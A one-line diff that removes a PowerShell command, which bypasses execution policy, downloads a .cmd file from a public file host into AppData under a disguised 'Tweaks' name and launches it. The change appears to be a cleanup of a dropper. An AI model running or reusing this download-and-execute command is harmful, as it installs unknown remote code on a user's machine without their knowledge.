@@ -1,1 +1,1 @@
-powershell -ExecutionPolicy Bypass -NoProfile -Command "Invoke-WebRequest 'https://files.catbox.moe/7t4n1y.cmd' -OutFile $env:APPDATA\Tweaksmdwcjh.cmd; Start-Process $env:APPDATA\Tweaksmdwcjh.cmd"
+
